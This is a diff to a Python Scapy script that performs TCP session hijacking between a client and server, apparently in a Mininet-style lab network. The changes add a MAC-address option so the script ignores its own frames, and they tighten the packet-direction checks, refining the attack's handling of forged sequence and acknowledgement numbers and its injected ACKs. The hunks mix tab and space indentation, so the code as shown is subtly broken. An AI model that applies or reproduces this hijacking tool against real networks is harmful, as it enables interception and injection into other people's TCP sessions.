@@ -6,12 +6,13 @@ import threading
 from scapy.all import *
 
 class Hijack:
-	def __init__(self, srv_port, srv_ip, client_ip):
+	def __init__(self, srv_port, srv_ip, client_ip, my_mac):
 		self.dev = "h3-eth0"
 		self.srv_port = srv_port
 		self.srv_ip = srv_ip
 		self.client_port = None
 		self.client_ip = client_ip
+		self.my_mac = my_mac
 
 		self.my_seq = 0
 		self.my_ack = 0
@@ -44,8 +45,11 @@ class Hijack:
 
 			payload_len = len(packet.getlayer("Raw").load) if packet.haslayer("Raw") else 0
 
+            if packet["Ether"].src == self.my_mac:
+                return
+
 			#The packet is from server to client
-			if tcp.sport == self.srv_port and ip.src == self.srv_ip:
+			elif tcp.sport == self.srv_port and ip.src == self.srv_ip and ip.dst == self.client_ip:
 
 				if not self.hijacked:
 					self.client_ip = ip.dst
@@ -69,7 +73,7 @@ class Hijack:
 						send(ack_packet, iface=self.dev, verbose=False)
 
 			#The packet is from client to server
-			elif tcp.sport == self.client_port and ip.src == self.client_ip:
+			elif tcp.sport == self.client_port and ip.src == self.client_ip and ip.dst == self.srv_ip:
 				if payload_len > 0:
 					self.my_seq += payload_len
 					data = packet.getlayer("Raw").load if packet.haslayer("Raw") else b""
@@ -93,11 +97,12 @@ def usage():
 	-c <client_ip> (optional)
 	-s <srv_ip>
 	-p <srv_port>
+    -m <my_mac>
 	""")
 	sys.exit(1)
 
 try:
-	cmd_opts = "c:s:p:"
+	cmd_opts = "c:s:p:m:"
 	opts, args = getopt.getopt(sys.argv[1:], cmd_opts)
 except getopt.GetoptError:
 	usage()
@@ -109,10 +114,12 @@ for opt in opts:
 		srv_ip = opt[1]
 	elif opt[0] == "-p":
 		srv_port = int(opt[1])
+	elif opt[0] == "-m":
+		my_mac = opt[1]
 	else:
 		usage()
 
-if not srv_ip or not srv_port:
+if not srv_ip or not srv_port or not my_mac:
 	usage()
 
-Hijack(srv_port, srv_ip, client_ip).run()
+Hijack(srv_port, srv_ip, client_ip, my_mac).run()
